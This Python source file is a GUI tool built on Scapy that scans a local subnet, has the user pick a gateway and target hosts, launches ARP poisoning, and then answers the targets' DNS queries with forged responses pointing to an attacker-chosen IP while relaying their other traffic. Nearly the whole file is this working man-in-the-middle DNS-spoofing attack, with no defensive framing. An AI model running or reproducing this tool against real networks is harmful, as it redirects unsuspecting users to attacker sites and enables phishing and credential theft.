from scapy.all import *
from dnsarp import dnsarp
import threading
from Tkinter import*
import sys
import os

class dnsfinal():
    
    def __init__(self, interface, root):
        self.interface = interface
        self.root = root
        
    def multiple_url(self):
        for widget in self.root.winfo_children():
            widget.destroy()
        Label(root, text='Please enter the URLs of websites. For example, facebook.com ').pack()
        scroll = Scrollbar(self.root)
        self.eula = Text(self.root, wrap=NONE, yscrollcommand=scroll.set)
        scroll.config(command=self.eula.yview)
        self.eula.pack()
        def get_multiple(self):
            self.full_list=[]
            self.line_list = self.eula.get('1.0', 'end').split('\n')
            for self.line in self.line_list:
                self.full_list.append(self.line)
            for self.line in self.full_list:
                if self.line != '':
                    self.url.append(self.line)
            self.ownMAC = get_if_hwaddr(self.interface)
            self.startProcess()
        def restart_program(self):
            python =sys.executable
            os.execl(python, python, * sys.argv)
        Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)
        Button(self.root, text="Submit", command=lambda: get_multiple(self)).pack()
        
    def url_y_n(self):
        for widget in self.root.winfo_children():
            widget.destroy()

        def set_y_n(self, s):
            input_choice = s
            #url contains all urls to redirect to the ip address specified above
            self.url = []
            if (input_choice == "y"):
                self.multiple_url()
            else:
            #get own MAC address
                self.ownMAC = get_if_hwaddr(self.interface)
                self.startProcess()

        def restart_program(self):
            python =sys.executable
            os.execl(python, python, * sys.argv)
        Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)

        Label(self.root, text='Do you want to selects URLs to redirect manually?').pack()
        Button(self.root, text="Yes", command=lambda: set_y_n(self, "y")).pack()
        Button(self.root, text="No", command=lambda: set_y_n(self, "n")).pack()
        
        
    def website_ip(self):
        for widget in self.root.winfo_children():
            widget.destroy()
        ipLabel = Label(self.root,
                        text='Enter the ip address of the website to where the user should be redirected:').pack()
        ipValue = Entry(self.root)
        ipValue.pack()

        def get_execute(self):
            self.ip_website = ipValue.get()
            for widget in self.root.winfo_children():
                widget.destroy()
            self.url_y_n()

        def restart_program(self):
            python =sys.executable
            os.execl(python, python, * sys.argv)
        Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)
        Button(self.root, text="Execute", command=lambda:get_execute(self)).pack()        
        
        
    def select_target(self):
        for widget in self.root.winfo_children():
            widget.destroy()
            
        self.target = []
        Label(self.root, text='Select the target IP').pack()
        OPTIONS = []
        for packet_sent, packet_received in self.ips_used:
            OPTIONS.append(packet_received[ARP].psrc)

        select = Listbox(self.root, selectmode="multiple", width=100)
        for each_item in range(len(OPTIONS)):
            select.insert(END, OPTIONS[each_item])
        select.pack()
        
        def get_select(self):
            for i in select.curselection():
                inputInt = int(i)
                self.target.append(
                    {"ip": self.ips_used[inputInt][1][ARP].psrc, "mac": self.ips_used[inputInt][1][ARP].hwsrc})
            self.website_ip()

        def restart_program(self):
            python =sys.executable
            os.execl(python, python, * sys.argv)
            
        Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)
        Button(self.root, text="Execute", command=lambda:get_select(self)).pack()
        
        
    def get_gateway(self):
        #now we will select the default gateway
        self.defaultGateway = []
        Label(self.root, text='Select one IP of the default gateway').pack()
        OPTIONS = []
        for packet_sent, packet_received in self.ips_used:
            OPTIONS.append(packet_received[ARP].psrc)

        select = Listbox(self.root, selectmode="single", width=100)
        for each_item in range(len(OPTIONS)):
            select.insert(END, OPTIONS[each_item])
        select.pack()

        def get_select(self):
            for i in select.curselection():
                inputInt = int(i)
                self.defaultGateway.append(
                    {"ip": self.ips_used[inputInt][1][ARP].psrc, "mac": self.ips_used[inputInt][1][ARP].hwsrc})
            self.select_target()

        def restart_program(self):
            python =sys.executable
            os.execl(python, python, * sys.argv)
        Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)

        Button(self.root, text="Execute", command=lambda:get_select(self)).pack()

    def get_IP(self):
        ipLabel = Label(self.root,
            text='Enter the range of IP addresses that you want to use (example: 192.168.5.85/24)').pack()
        ipValue = Entry(self.root)
        ipValue.pack()
        
        def get_execute(self):
            self.ip_range = ipValue.get()
            self.ips_used, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=self.ip_range), timeout=3,
                                   iface=self.interface)
            for widget in self.root.winfo_children():
                widget.destroy()
            self.get_gateway()

        def restart_program(self):
            python =sys.executable
            os.execl(python, python, * sys.argv)
        Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)
        Button(self.root, text="Execute", command=lambda:get_execute(self)).pack()
    
    
    def getInput(self):
        self.get_IP()
        

    def startProcess(self):
        arpprocess = dnsarp(self.interface)
        arpprocess.setInput(self.ip_range, self.ips_used, self.defaultGateway, self.target, self.ownMAC, "y", "loud")
        proc_thread = None
        proc_thread = threading.Thread(target=arpprocess.startProcess)
        proc_thread.daemon = True
        proc_thread.start()
        for widget in self.root.winfo_children():
            widget.destroy()
        scroll = Scrollbar(self.root)
        self.eula = Text(self.root, wrap=NONE, yscrollcommand=scroll.set)
        scroll.config(command=self.eula.yview)
        self.eula.pack()
        self.eula.insert(END, "DNS sniffing has started" + '\n')
        self.eula.see(END)
        self.eula.update_idletasks()
        while True:
            sniff(store=0, prn=lambda packet: self.doSpoofing(packet), iface=self.interface)

    #method which does the DNS spoofing of a packet
    def doSpoofing(self, packet):
        #checks whether it is a correct packet
        if packet.haslayer(Ether) and packet.haslayer(IP):
            try:
                #checks whether it is a DNS packet
                if (packet.haslayer(DNS)) and (packet[DNS].qr == 0):
                    #CASE WHERE THE PACKET COMES FROM GATEWAY AND THUS SHOULD BE FORWARDED TO TARGET2                
                    if(self.defaultGateway[0]["mac"] == packet[Ether].src):
                        receiver = None
                        for tar1 in self.target:
                            if(tar1["ip"] == packet[IP].dst):
                                receiver = tar1
                                packet[Ether].src = self.ownMAC
                                packet[Ether].dst = receiver["mac"]
                                if(packet.haslayer(DNS)):
                                    print("BALLS WEAK ARM SWAETY 1")
                                sendp(packet, iface=self.interface)
                    #Case where packet does not come from gateway
                    else:
                        #check whether source is on the list of targets to spoof
                        for tar1 in self.target:
                            if tar1["mac"] == packet[Ether].src:
                                #Case the user entered specific websites to spoof
                                should_be_spoofed = False
                                if(len(self.url) > 0):
                                    for domain in self.url:
                                        if(domain in packet[DNS].qd.qname):
                                            should_be_spoofed = True
                                        
                                #Case all URLs should be spoofed or it was in the list of URLs to spoof
                                if(len(self.url) == 0 or should_be_spoofed):
                                    #create fake response packet
                                    spoofedETHER = Ether(src=packet[Ether].dst, dst=packet[Ether].src)
                                    spoofedIP = IP(src=packet[IP].dst, dst=packet[IP].src)
                                    spoofedUDP = UDP(sport=packet[UDP].dport, dport=packet[UDP].sport)
                                    spoofedDNSRR = DNSRR(rrname=packet[DNS].qd.qname, rdata=self.ip_website)
                                    spoofedDNS = DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1, an=spoofedDNSRR)
                                    #send the packet
                                    #print("SPOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOFED")
                                    sendp(spoofedETHER/spoofedIP/spoofedUDP/spoofedDNS, iface=self.interface)
                                    #print("we spoofed IP: {}, Query: {}, response: {}".format(packet[IP].src, packet[DNS].qd.qname, self.ip_website))
                                    self.eula.insert(END, "we spoofed IP: {}, Query: {}, response: {}".format(packet[IP].src, packet[DNS].qd.qname, self.ip_website) + '\n')
                                    self.eula.see(END)
                                    self.eula.update_idletasks()
                                #Packet was not supposed to be spoofed
                                else:
                                    packet[Ether].src = self.ownMAC
                                    packet[Ether].dst = self.defaultGateway[0]["mac"]
                                    if(packet.haslayer(DNS)):
                                        print("BALLS WEAK ARM SWAETY 2")
                                    sendp(packet, iface=self.interface)                        
                else:
                    if(packet[Ether].src == self.defaultGateway[0]["mac"]):
                        packet[Ether].src = packet[Ether].dst
                        for tar in self.target:
                            if tar["ip"] == packet[IP].dst:
                                packet[Ether].dst = tar["mac"]
                        #print("from: {}, {} . to: {}, {} .".format(packet[IP].src, packet[Ether].src, packet[IP].dst, packet[Ether].dst))
                        sendp(packet, iface=self.interface)
                    else:
                        for tar in self.target:
                            if tar["mac"] == packet[Ether].src:
                                packet[Ether].src = self.ownMAC
                                packet[Ether].dst = self.defaultGateway[0]["mac"]
                                sendp(packet, iface=self.interface)
            except:
                print("OOPSIE DOOPSIE")
                
            

                
            
